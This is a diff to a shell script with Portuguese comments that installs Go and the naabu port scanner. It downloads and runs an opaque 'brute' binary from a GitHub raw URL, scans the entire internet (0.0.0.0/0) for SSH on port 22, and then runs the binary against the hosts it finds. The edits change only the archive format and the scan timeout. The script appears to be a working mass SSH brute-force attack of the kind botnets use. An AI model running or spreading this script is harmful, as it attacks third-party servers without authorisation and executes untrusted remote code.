@@ -5,7 +5,7 @@
 
 go_url='https://go.dev/dl/go1.26.5.linux-amd64.tar.gz'
 
-url_naabu='https://github.com/projectdiscovery/naabu/archive/refs/tags/v2.6.1.zip'
+url_naabu='https://github.com/projectdiscovery/naabu/archive/refs/tags/v2.6.1.tar.gz'
 
 url_brute='https://github.com/atilabyte/golang/raw/refs/heads/master/brute' 
 
@@ -33,7 +33,7 @@ wget $url_brute -O brute || curl -L $url_brute -o brute
 chmod +x brute nabu  || chmod 777 brute nabu
 
 
-timeout  120s     ./nabu  -p 22 -host  0.0.0.0/0   > ips     #120  segundos para  pega os ips
+timeout  60s     ./nabu  -p 22 -host  0.0.0.0/0   > ips     #60  segundos para  pega os ips
 
 
 timeout  1000s  sh -c  ./brute   #1000 segundos pra testa os ips
@@ -75,10 +75,11 @@ tar -xf  go.gz
  
 cd go ; cd bin 
 
-wget $url_naabu  -O naabu.zip || curl -L $url_naabu -o naabu.zip
+wget $url_naabu  -O naabu.gz || curl -L $url_naabu -o naabu.gz
 
 
-unzip  -o  *.zip
+tar -xf naabu.gz
+
 
 cd  *.1/cmd/naabu 
 
